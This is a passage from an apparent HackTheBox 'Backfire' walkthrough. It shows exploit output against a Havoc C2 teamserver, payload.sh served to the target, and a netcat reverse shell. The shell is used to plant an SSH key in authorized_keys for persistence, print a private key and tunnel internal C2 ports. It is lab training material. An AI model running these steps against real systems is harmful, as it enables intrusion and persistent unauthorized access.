b&#x27;\x00\x00\x00\xcc\xde\xad\xbe\xef\x00\x06P\xd9\x00\x00\t\xec\x00\x00\x00\x08\xdc\x95\xc0\xc0\xa2@\x89\x98\xbcY\xb3\x05\x92\x84 \x84S\x0f\x8a\xfa\xc7E6\x19\xee&amp;\xe0\xd1\xeb\xa3\x12\xfd\xa1\xc4o\x1d\x054?&gt;(\x7f\xeb\xe2\xb7\xf9\xd5w\x01\x149\xea\x06\x94\x1dZ\xe1\x8c\xc5\xa0D&lt;\x01\xbe\xed\x7f\x87%G\x1f\x91\x1c3\x89=A},A\x92%2\xa4\x82\xea\xde\x0b=k?r\x8d\xc5iYk\xb9\xab\xe1I\x01\xfd]P\x12\xf4\xc8\x85L\x9b4\xc5\xdf\x82\x1e\xd5\xa2\x9d\xc9N\x8d\xd9hK\x1f;d\x97\x8b\xcf9\x98\x18\xd4\xa3^4\xc6\x84\xa7\x95Y\xcf\x1e\x8cm\xaa\xcf\x1a{\x87\xce^\x8a\xbd]\xf6tME&amp;\x00\x91\xd4\x05\xb3\x91\xc5\x1a\xaa\x8dF_\xf5\xbc\xe8\x9b4s\xa5\xefxe\xa2&#x27;
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
b&#x27;\x00\x00\x01\x00\xde\xad\xbe\xef\x00\x06P\xd9\x00\x00\t\xec\x00\x00\x00\x08\xdc\x95\xc0\x94\xa2@\x89\x98\xbcY\xb3\x05\x92\x84 \x84S\x0f\x8a\xfa\xc7E6m(\x9d\xb4=\xb1\xad\xe2\x98\xc0\xe3\x93A\\\x7f\xd8GRSv\x89\xa1\xf3c)=&amp;\xe9\xfb\x12\xa1\xc8\x14\xd3\xab\x16\xf9&quot;Z\x84\xbf\x9aI\x16\x0eZM\x12\\\x0c\xbf\xaaT\x01^\x9f\xd0\x01\x14h\x94\xc0\xe5\x8d\x14#+\xbb\xc4\xe7\x0b\xcdo\x95\x97,\x010\xad\x84\x17-\xc0_\x96R\xc0\xc6\xd5\xad\xf9\xbe\xc6\xd0\xca\x00\x0f\xf0\xbf\xbf\x11\x17\r\xbb\xdc\xfc\xb0\xc6\xfcN\x90.E\x08\xec\x0c\xf4\xf9&amp;\x14[\xed\x11\\\x98\x7f\x02\x04\x82S\x97Cs\x92S\xcb!\x05y\x7f\x881\xf6\x00\xc3&amp;\xb8C\x07&quot;\xd8\x07\xe3\xb1\x1c\xa7\xa7\xad4\xc8\x97\xb0I+J\xb87-\x07\xabe@\x8e\xa4\x13P\x07\xe8jM\xfda\x14v\xf9\xa45\x8bw#\\\xcbR\xee\x1aH\x1a\xaca\xc6\x10q\xcf\xd3\xf3\x1c[\x18t\xe1\xbe\xeb\x8b&#x27;
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
b&#x27;\x00\x00\x02\x1f\xde\xad\xbe\xef\x00\x06P\xd9\x00\x00\t\xec\x00\x00\x00\x08\xdc\x95\xc2s\xa2@\x89\x98\xbcY\xb3\x05\x92\x84 \x84S\x0f\x8a\xfa\xc7E7J(\x9d\xb5\x1ard\x8b\xec\x03*\xfa5\x9f\xb6\xb13\x91\x9a\x1f\xfdb:\n]\xfe\xef\x80\x8f\xc9l\xb3w\x02\x7f~\xcb\xf9\x89\xef\xcbG\xc5k\x07\x94\x96m^\x9e)\xc5a\xcb\x83\xec\xa0\xdf\xde\x1d\xb6\x19$\xa5{\xf7\xf1\xad\xebn\xd7\x8a\x1d\x07\x0f\x12f\xb5=\xf5r\xf4\x16t\xa5\xbfQ\xec\xb3Xo\xc5\xb6\x02\x081$r)\xc4#\x90\x9e\x90\xa4yx\xfd\xc5\xbaCLa\xc5?g\xea&lt;\xf0p=.\x9f9\xee\xae\xb6(\xba\xe5\x06\x7fK\t\x98\xba;\x94\xa0_\xfe\xeaW.\xb7\xe302\x7f\xba\x11{\x8ee\xcf\xf8\x98:\xb9\xb2\xf5s\x809d-\x88\x01&gt;/\xde|\xa81\xbbz=g\xd5w\xc4\xe5\xcb\x11\x9eg\xe1\xfa\x1b\x84\xd7\xf7cu\x92b&quot;o\xc7\xfc#\x88P\xf4\xd7\x8e\xd91Ya\x05\x8d\xed\xc8u\x87\xe4hy\x8a/OM\xfc\xbc?\xe7K~\xf2\x0b#k\x8e\x1fzn\xaf&quot;\xce\xa8:\x06\x94\xa4\x9d\x07\x8b4\x9d[\x0b)\x16=3\xc1\xe8\x83&amp;\x16%O&gt;&lt;\xa5\xaf\xc3q\x83\xf4\x94\xe0J\x0c0\x9d-;mY\xd2\xde\xa61\xf5\xe1LdQ\xb2\xc7\x7f\xe8\xc0r\x1a:Dh\xafF\x85\x1a\&#x27;\xdd\xe9\x18]\xf2\xc3\xa2\xe3\x90\xf3\xf7\x93\xbf/\x9a\xaf(\x816\xeemt\xb6\x8e\x9fd\x9d!\x8d\xcf\x94\xdc\x99)t\xad\xa5\nG\xa9\xa8=z\xc8\x8c{ki6e\x9b\x03\x91\xec`\xc0\x10^=#\xc5\x01p&lt;s\xd4qQ:\xbd\xbc\x9bL9\x11NQ\xfbj!\xf1\xce\x9fd\x08ZO\x1aD\xe7R\x12dT9\xa4\xb9w6\xe2I\xee\xb7\xc4\xfc7k\x9d8\x0b\xef\x00+\xe6)\xf7H\xd2\x17\xc9{y\xc4\x88\xdd\x14BU\x07D-\x16p\x07P\xe5\xd0\xfbj\xaaP}\xa7O\n\xcd\x8b\xffuv\xf901\x95\xee\x9d\xbc\xcegq\x8a\xef\xbb\xe2&quot;\xbb\x109\x0e\xebs\xbf\xf9!\xae\x7f\x84\xc2\xe8\x9e\x12J\xfe\x92\xdc\xb8\x1cz\xfcKn#F\x93\xc1&#x27;
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
b&#x27;\x00\x00\x03\x92\xde\xad\xbe\xef\x00\x06P\xd9\x00\x00\t\xec\x00\x00\x00\x08\xdc\x95\xc3\x06\xa2@\x89\x98\xbcY\xb3\x05\x92\x84 \x84S\x0f\x8a\xfa\xc7E5\xdf(\x9d\xb7\xafj\xe7!\xb2\x1b\xa9Pk\x875\x1bm\x89\x19\xb5\xa3z\xb9\xa0\x03\xe6l*\xd1\xd8\xed\x1d#\x0b\xda\xde\xc7\xbe\x08]\x97Q&quot;\x86|\x8c\x08\x91n\xcf\xe6Jo\x8aHF\xf4\xc9O\xe1\xee\x1b\xb5\x01)\xed\x13 \xb4cI\x0f\x04D\xc8\xff1\xd3\xea_.\xee\x99\xa2\xfb\xae\xd0F\xf0=\xc6o\xfeN\xb2\x95`+\xf8\x12}\xc0R\x13\xb6K\xb9K\x91\x9c\x8b\xa4A\x9f\xbc\xcf\xdck\\\x8cYzB\xda\xe0\xe3x\xc6\xea\x9e\xd2\x96T\\W^w\xcft\xb0\xe4\xa9\x98\xd5\xed\xb5\x8c\xd4-\xa2\x90\xa1\xe3-q~\xc5)=N\xf8$O\xfb,&lt;\t\xfc\x1c{-\x99\xa4}[\x9f-1(\xc5\xfb\xb3\x10\xe0\x90\x01lJG\x90\x04|(v\x1b\xd1uz-\x0f,\xbb\xc6F\x95\xb9Z\x9b{5\xf6u\xfc\x88\xaf-\xdf&gt;\xc7`XJ\xcf\x17\xads#\xdbc\xbc\xdb\xb05\xf4\xdd\x86\n\xa4\xa7&gt;\xd7&gt;\xd4g\xbb\xcb\x9c\x0f=\xcc\xa6\xe3w\x0c\xcd\xcd\xde\xa4U\xdf6%\xbf\xc6l\xa4.3s\xa2w(\xbe,\xf8\xab\x90\x1a\xc6\xa1{\xbf\x16N+\xa0@\xe6\x03g,V\x17\xe7D\xad1U\xd3\xbb\xc2x3\x80{\xcb1\xe2]\xbb\x04\x0e\x8f\x99{e\x80\xfc\x83~\x9fD\x02\x8a\xbed\xec\x1c\xdb\xea\xe3q*\xcb\x02I\xc6\xad\xe4\x81\x84\x84\xc9\xe5\xa4\x98\xcd\xb9\xf9\xf4\xbf\x9cea\xb9\tI\x81~\xda\xe1Q\xc2\x8as\xd5\x91\xaf[T`\xe8Hm\t\x1b\xc7Z\xb3\xf0Z\x08+\xb2m\x9b\x17#,\x04\xd7\xa9Y0*\x8b\r:\x96\xbd\xb1\xc4\xa8\xdb\xff\x1a,w\x9a\xa3\xb8\xbd\xc3C\xa1\x057\x19n\xcd\xfdRK\xc1\x84N\xa4!\x8c\xf4\xd2\xc5\x00\\\x99\xce]-\x9d\xae\xe4\x86P\xc0\x80\x07\xa2D\x11\x18M+\xb6u\xf3_oO@\x08\xc8\xdaC\xc1Q\xa8%\\\xf98^\xb8\x16C&quot;\x95\xbb\xbb\xfd\x15W\xdf\x00\x07\xbe}\x80m\x9c\xc6]\xcaZ\xd1\xf8\xe1@^M;\xb5\x88\xfd\xb0L\xca\xc1Z\xe8}\xaa\xd0\xb4f\x86IJ;Mn\xe4&amp;@\xc8:K\x97s\x95W\x80=\x86O\x85\x0e\xfc\x01\xaa\xb2\xa9\xea\x12\x15\x8d\xc3b\xfd\xae2,\x93\x10\xfd&amp;\xa7rj\xc5\xcb\x85\xfe\xbbf\xd0A \x98\xef\xd3\xe4\xd7&amp;\x8d\xb0g\xdc6\x0c\x1cf]\x88\xb1N\xbbFDq\x96\xd4\xf8\x86\xbds\x8b`G\xeahf\x93-\xe9\xb6W1\xaf/E~j\xb0H\xaf\x94F\xc3u\x05yr\x90z$\x88\xb6xLG\xcc~\xe27\xf2\x98L\xa0L\xcf\xbd\xf7\xacI\x9cz\xf1\&#x27;#\x06\xfb\xcf\x80w\xd0\xddU\xad\xe6\xbe\x86\xb7\x11Y?*V\t\xcb&amp;\xeeY\r\x99PF\x1a\xd3t\xef\x17\xc9\xcfK\xf4\x89F0\x1b\\t\xe4\xbdw\xcat\xc8\xfb\x1dr\xff\x80m}\x99\xc5\x02\xb8P\x07\xc75\xe6\xfd\xb2\xb3\x9d\x057k\xa9\\S\x88\x99P\x15D\x1e\x1eOU\xd4.}t\x8e4SE\xe9\x9byEvkT1~\xd5\x13_\xc0xG\xd45\xc8\xa4\&#x27;Qf\x83X\x9d\x0f\xb3\t\xe5\xe6\x9a\xf3\xda\xd0\xe7\x9e\xb7=7lB\xe2\x8c\xec#&amp;4o$n.\xc6j\xfa\x97l[]\xad\xfdHi\xe0\xc7\xf0f\x9d\xd6\x91\x86{\xd7$\xc9!\xf1(q/\xd3\xbb\xba\x87s9qU\x7f\xb9p[\xdb+f\xa5\xdc\n\x9e\x8b\x85\xf2\xde-\xa2\xfb\x19w\x0fW7\xa9(\xf3\x80\x7fz\xc6\xf2uCV\xe5\x1b\x8c&lt;\xc3\xf9\\\x1e\x89\xcf&#x27;
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!</code></pre>
</div>
</div>
<p><h3>Python HTTP server:</h3></p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.205.176 - - [22/Jan/2025 21:51:44] &quot;GET /payload.sh HTTP/1.1&quot; 200 -
</code></pre>
</div>
</div>
<p>Netcat listener to catch the reverse shell:</p><p>Since the reverse shell is unstable and there is a cron job that automatically disconnects the shell, we can generate an SSH keypair on the <strong>ilya</strong> user and use the private key (<code>id_rsa</code>) to log in via SSH for a more stable and persistent access.</p><p >Here&#x27;s the process:</p><ol type="1" class="numbered-list" start="1"><li><strong>Generate SSH Keypair on the Target (ilya user)</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">Log in as the <strong>ilya</strong> user.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Run <code>ssh-keygen</code> to generate a new SSH keypair.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">By default, this will create two files: <code>id_rsa</code> (private key) and <code>id_rsa.pub</code> (public key) in the <code>~/.ssh/</code> directory.</li></ul></li></ol><ol type="1" class="numbered-list" start="2"><li><strong>Retrieve the </strong><code><strong>id_rsa</strong></code><strong> Private Key</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">Download or copy the <code>id_rsa</code> private key from the target machine to your local machine.</li></ul></li></ol><ol type="1" class="numbered-list" start="3"><li><strong>Place the Public Key in </strong><code><strong>authorized_keys</strong></code>:<ul class="bulleted-list"><li style="list-style-type:disc">On the target machine, add the <code>id_rsa.pub</code> content to the <code>~/.ssh/authorized_keys</code> file. This allows you to authenticate using the private key.</li></ul></li></ol><ol type="1" class="numbered-list" start="4"><li><strong>Log in via SSH</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">Use the <code>id_rsa</code> private key to log in to the <strong>ilya</strong> user via SSH for a more stable connection</li></ul></li></ol><p>With this setup, you&#x27;ll have a more reliable and persistent SSH access to the system, avoiding the issues caused by the cron job and unstable reverse shell.</p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>nc -lvnp 4444     
listening on [any] 4444 ...
connect to [10.10.14.33] from (UNKNOWN) [10.129.205.176] 56224
bash: cannot set terminal process group (8506): Inappropriate ioctl for device
bash: no job control in this shell
ilya@backfire:~/Havoc/payloads/Demon$ ssh-keygen -t rsa -b 4096 -C &quot;ilya&quot;
ssh-keygen -t rsa -b 4096 -C &quot;ilya&quot;
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ilya/.ssh/id_rsa):    
/home/ilya/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): apple
aEnter same passphrase again: apple
Passphrases do not match.  Try again.
Enter passphrase (empty for no passphrase): apple
Enter same passphrase again: apple
Your identification has been saved in /home/ilya/.ssh/id_rsa
Your public key has been saved in /home/ilya/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:T8ic3sxZn/vRkiXFpa/2oKv01BvobhpnIoxwN5uBHcY ilya
The key&#x27;s randomart image is:
+---[RSA 4096]----+
|                .|
|       .       o.|
|        E     . o|
|       * +     o |
|    . o S . . . o|
|     o = @ o + *.|
|      . * X = @..|
|         o O.o B.|
|          o=*.o.o|
+----[SHA256]-----+
ilya@backfire:~/Havoc/payloads/Demon$ cd /home/ilya/.ssh/
cd /home/ilya/.ssh/
ilya@backfire:~/.ssh$ cat id_rsa.pub
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDIGZr6PZu5Vzufextg/QjV/GxPqAkVxr2VF9B3smB+KeA1ajsx1UJGGQREI4DFYnZuY5FoflJajSMyNtTEmUKPNixk7j84CL+4cL2lcnuLRtbILPuTtqGAasW+3aDedcbdZs/GtkZGxXGR0EztjdfB1DAMzrspoKaMqy0L/2GX87UioEcpKMO6cyo2+1oAKtlwvWnE1obRxrXvYCQUnVL88a6musC7c2LmOyjvisKmB1ReefZ+2b8meR+4doQnoGn3d5e8vEpyaQLyldAgvBdZvqcRpfQln7xIqWnJYojmfwe7dfYvIPEN2FRZTCRU1NkZB3/dp1ZTZ1XvEYlJc40/370Ox/2+thnSuUnduYroDhJ32OaaUontj2reHDe0mdrGKmlWlRoinu4fz2phle3Vkvhzx9pn152UzRgvdqqwnE8iiVfFYQtfkljkikCRAd8p3NX1FPqEA1K9Osd3U0PM5EXDUHMRCLPvmHs18fLQ0py/XdYFamRl6JB+w0qPYmfUMS0DfKH5I+AlLHKICFdqSwLe+jEHY6/PujP8hk0IWoy533iGRHgJLebfMgwIA0s9RzLuVkUkNqllP/PG+P2zOYJOoKg9nWCZxCzGl8A+PeF+Wvezm2t+la2VbIrqpQvcAbfOGSUSu+MgLXldCI+Q1hbOAByUOrxqLeIEoUmmPw== ilya
ilya@backfire:~/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDIGZr6PZu5Vzufextg/QjV/GxPqAkVxr2VF9B3smB+KeA1ajsx1UJGGQREI4DFYnZuY5FoflJajSMyNtTEmUKPNixk7j84CL+4cL2lcnuLRtbILPuTtqGAasW+3aDedcbdZs/GtkZGxXGR0EztjdfB1DAMzrspoKaMqy0L/2GX87UioEcpKMO6cyo2+1oAKtlwvWnE1obRxrXvYCQUnVL88a6musC7c2LmOyjvisKmB1ReefZ+2b8meR+4doQnoGn3d5e8vEpyaQLyldAgvBdZvqcRpfQln7xIqWnJYojmfwe7dfYvIPEN2FRZTCRU1NkZB3/dp1ZTZ1XvEYlJc40/370Ox/2+thnSuUnduYroDhJ32OaaUontj2reHDe0mdrGKmlWlRoinu4fz2phle3Vkvhzx9pn152UzRgvdqqwnE8iiVfFYQtfkljkikCRAd8p3NX1FPqEA1K9Osd3U0PM5EXDUHMRCLPvmHs18fLQ0py/XdYFamRl6JB+w0qPYmfUMS0DfKH5I+AlLHKICFdqSwLe+jEHY6/PujP8hk0IWoy533iGRHgJLebfMgwIA0s9RzLuVkUkNqllP/PG+P2zOYJOoKg9nWCZxCzGl8A+PeF+Wvezm2t+la2VbIrqpQvcAbfOGSUSu+MgLXldCI+Q1hbOAByUOrxqLeIEoUmmPw== ilya&quot; &gt;&gt; ~/.ssh/authorized_keys
&lt;ByUOrxqLeIEoUmmPw== ilya&quot; &gt;&gt; ~/.ssh/authorized_keys
ilya@backfire:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
Fdpw==
-----END OPENSSH PRIVATE KEY-----
ilya@backfire:~/.ssh$  </code></pre>
</div></div>
</section>
<section id="Post-Exploitation" class="section">
<h2>Post-Exploitation:</h2><p>After obtaining the private key (<code>id_rsa</code>), we connect to the target machine via SSH. Once logged in, we navigate to the user&#x27;s home directory and locate the <code>user.txt</code> file. Reading this file reveals the user flag, completing this stage of the exploitation.</p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>┌──(deepak㉿kali)-[~/HTB_Machines/Medium_linux/Backfire/exploit]
└─$ chmod 600 id_rsa
                                                                                                                                                                                                                                              
┌──(deepak㉿kali)-[~/HTB_Machines/Medium_linux/Backfire/exploit]
└─$ ssh -i id_rsa ilya@backfire.htb
Enter passphrase for key &#x27;id_rsa&#x27;: 
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
ilya@backfire:~$ ls
files  hardhat.txt  Havoc  user.txt
</code></pre>
</div></div>
</section>

<section id="lateral Movement" class="section">
<h2>Lateral Movement:</h2>
<p>After connecting to the target machine, reading the <code>hardhat.txt</code> file reveals valuable information. It indicates that the server is running <strong>HardHatC2</strong> with default configurations, as it was installed for testing purposes. The note also mentions a preference for <strong>Havoc</strong> over HardHatC2 and highlights the use of <strong>Go</strong> instead of <strong>C#</strong>, suggesting potential avenues for further exploration of the C2 framework.</p><p>To configure and run the <strong>HardHatC2</strong> Team Server and Client:</p><ol type="1" class="numbered-list" start="1"><li><strong>Configure the Team Server</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">Edit the file <code>HardHatC2\TeamServer\Properties\LaunchSettings.json</code>.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Update the <code>&quot;applicationUrl&quot;</code> value from <code>https://127.0.0.1:5000</code> to the desired address and port.</li></ul></li></ol><ol type="1" class="numbered-list" start="2"><li><strong>Start the Team Server</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">From the top-level folder <code>../HardHatC2/TeamServer/</code>, run the command <code>dotnet run</code> to start the Team Server.</li></ul></li></ol><ol type="1" class="numbered-list" start="3"><li><strong>Start the HardHat Client</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">Set the target Team Server location in the command line when starting the client. For example: <code>dotnet run https://127.0.0.1:5000</code>.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Open a web browser and navigate to <code>https://localhost:7096/</code>. If successful, the login page will appear.</li></ul></li></ol><ol type="1" class="numbered-list" start="4"><li><strong>Log in</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">Use the default credentials (<code>HardHat_Admin</code>) with the password printed during the first Team Server startup.</li></ul></li></ol><ol type="1" class="numbered-list" start="5"><li><strong>Create a New User</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">After logging in, navigate to the settings page to create a new user.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Upon success, log in with the newly created account to access the full HardHatC2 client.</li></ul></li></ol>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>ilya@backfire:~$ cat hardhat.txt 
Sergej said he installed HardHatC2 for testing and  not made any changes to the default.I hope he prefers Havoc bcoz I don&#x27;t wanna learn another C2 framework, also Go &gt; C# 
ilya@backfire:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:7096            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:40056         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 0.0.0.0:68              0.0.0.0:*                 </code></pre>
</div></div>

<p>From the <code>netstat -tuln</code> output, we observe that ports <strong>7096</strong> and <strong>5000</strong> are open and listening. These ports are likely associated with the <strong>HardHatC2 Team Server</strong> and Client interface. To access these services remotely, we can use <strong>SSH port forwarding</strong> to tunnel the traffic through the compromised machine.</p><p>By forwarding these ports to your local machine, you can interact with the Team Server and Client interface as if they were running locally.</p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>ssh -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000 -i id_rsa ilya@backfire.htb
Enter passphrase for key &#x27;id_rsa&#x27;: 
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Jan 22 11:57:53 2025 from 10.10.14.33
ilya@backfire:~$</code></pre>
</div></div>
<p>After setting up port forwarding for <strong>port 7096</strong>, we visit <code>https://127.0.0.1:7096/</code> in a web browser. This opens the <strong>HardHatC2 Client login page</strong>, allowing us to interact with the C2 framework.</p>
<img src="./web3.jpg" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
<br><br>
<br><br>
<h3><strong>HardHat C2 Authentication Bypass:</strong></h3><p>HardHatC2 contains an authentication bypass vulnerability that can be exploited to gain unauthorized access to the system. By leveraging a specific exploit, we can bypass the authentication mechanism and gain access to the client interface without needing valid credentials. This vulnerability provides an opportunity to further compromise the system and gain control over its operations.</p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
